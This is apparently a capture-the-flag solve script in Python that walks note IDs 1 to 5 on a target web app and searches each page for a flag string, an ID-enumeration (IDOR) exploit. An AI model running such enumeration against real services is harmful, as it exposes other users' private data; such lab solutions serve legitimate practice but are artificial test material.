import sys
import re
import urllib.request

def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
    
    # Try IDs from 1 to 5 to find the hidden note
    for i in range(1, 6):
        url = f"{target}/note?id={i}"
        try:
            req = urllib.request.Request(url)
            with urllib.request.urlopen(req) as response:
                html = response.read().decode('utf-8')
                flag_match = re.search(r"flag\{[a-zA-Z0-9_\-]+\}", html)
                if flag_match:
                    print(f"[+] Exploit successful! Flag: {flag_match.group(0)}")
                    sys.exit(0)
        except Exception as e:
            continue
            
    print("[-] Flag not found.")
    sys.exit(1)

if __name__ == "__main__":
    main()
